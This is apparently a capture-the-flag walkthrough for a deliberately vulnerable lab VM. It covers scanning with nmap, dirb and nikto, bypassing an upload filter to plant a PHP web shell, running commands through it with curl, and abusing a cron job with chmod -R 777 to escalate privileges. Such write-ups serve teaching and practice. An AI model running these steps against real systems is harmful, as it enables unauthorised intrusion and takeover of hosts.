1. Scan the network for online devices.
    ```bash
    $ sudo netdiscover -i eth0
    ```
    ![image](https://hackmd.io/_uploads/r1THU7yOxe.png)
2. Scan the target IP.
    ```bash
    $ nmap -sV 192.168.163.136
    Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 02:34 EDT
    Nmap scan report for 192.168.163.136
    Host is up (0.00033s latency).
    Not shown: 989 filtered tcp ports (no-response), 10 filtered tcp ports (host-prohibited)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
    MAC Address: 08:00:27:A5:A6:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.41 seconds
    ```
3. Directory traversal.
    ```bash
    $ dirb http://192.168.163.136
    ```
    ![image](https://hackmd.io/_uploads/S1lWsXy_ex.png)
   Visit `robots.txt`.
   ![image](https://hackmd.io/_uploads/HJZmom1dll.png)
   These three paths all return `301`, and appending `/` redirects to another page with a message saying we are in the wrong place.
   ![image](https://hackmd.io/_uploads/BkkTimkuxl.png)
   Visit `http://192.168.163.136/images/` and see the directory listing.
   ![image](https://hackmd.io/_uploads/ry4uTQJulg.png)
4. Use `nikto` for a more complete vulnerability scan.
    ```bash
    $ nikto -h http://192.168.163.136
    ```
    ![image](https://hackmd.io/_uploads/HyhTTQJOgg.png)
5. This is definitely a “Happy New Year” vibe - the directory name is too on-the-nose.
    ```text
    http://192.168.163.136/fristi/
    ```
    ![image](https://hackmd.io/_uploads/ByyEhVJ_ll.png)
   In the page source, a base64 string is found.
   ![image](https://hackmd.io/_uploads/rJkWoVg_xg.png)
   Since the string starts with `iVBORw0KGgo...`, it is clearly a PNG image encoded in base64. Decode it with a [base64-to-image tool](https://base64.guru/converter/decode/image) to reveal an image.
   ![image](https://hackmd.io/_uploads/rkxqsNgOlg.png)
   The source also contains a hidden hint from the author.
   ![image](https://hackmd.io/_uploads/HJI1GHxuxg.png)
   We then try logging in with `eezeepz/keKkeKKeKKeKkEkkEk`.
   ![image](https://hackmd.io/_uploads/H1g2ZBeuxx.png)
6. After entering the upload page, upload a normal image first.
   ![image](https://hackmd.io/_uploads/SynM1dedeg.png)
   Go to `/uploads`.
   ![image](https://hackmd.io/_uploads/BkC91OgOlx.png)
   Try adding the filename too.
   ![image](https://hackmd.io/_uploads/BJy6yuldge.png)
   Now that the flow is confirmed, we attempt to upload a `shell` payload. To bypass the extension check, change `php` to `gif`.
   The upload seems to succeed, but because the browser treats it as an image, it displays an error.
   ![image](https://hackmd.io/_uploads/Hy7agdg_ex.png)
   Now use Burp to modify the request. Intercept a normal image upload request first.
   ![image](https://hackmd.io/_uploads/S1FIMuedxl.png)
   Only change the `filename` and insert the PHP shell payload into the content.
   ![image](https://hackmd.io/_uploads/HJOyXdxOlx.png)
   Test with a simple command.
   ![image](https://hackmd.io/_uploads/HkBNXux_xx.png)
   Bingo!
7. Start searching for the flag.
   First use `find` to inspect text files under `/home`.
   ```bash
   $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=find%20/home%20-name%20*.txt"
   ▒/home/eezeepz/notes.txt
   ```
   This reveals a clue.
   ```bash
   $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/home/eezeepz/notes.txt"
   ▒Yo EZ,

   I made it possible for you to do some automated checks,
   but I did only allow you access to /usr/bin/* system binaries. I did
   however copy a few extra often needed commands to my
   homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those
   from /home/admin/

   Don't forget to specify the full path for each binary!

   Just put a file called "runthis" in /tmp/, each line one command. The
   output goes to the file "cronresult" in /tmp/. It should
   run every minute with my account privileges.

   - Jerry
   ```
   * This hints that there is a cron job running as `Jerry` that executes every minute.
   * The cron job checks `/tmp/runthis` and executes each line as a command.
   * Output is written to `/tmp/cronresult`.
   * Only commands under `/usr/bin/*` and a few commands copied under `/home/admin/` are allowed (e.g., `chmod`, `df`, `cat`, `echo`, `ps`, `grep`, `egrep`)
8. Use this to escalate privileges.
   Change the directory permissions so cron can enumerate `/home/admin` and expose useful information.
   ```bash
   $ curl "http://192.168.163.136/fristi/uploads/shell.php.jpg?cmd=cat%20/tmp/runthis"
   ▒/home/admin/chmod -R 777 /home/admin
   ```
   * Originally, `/home/admin` was heavily restricted and generally readable only by `admin` or `root`.
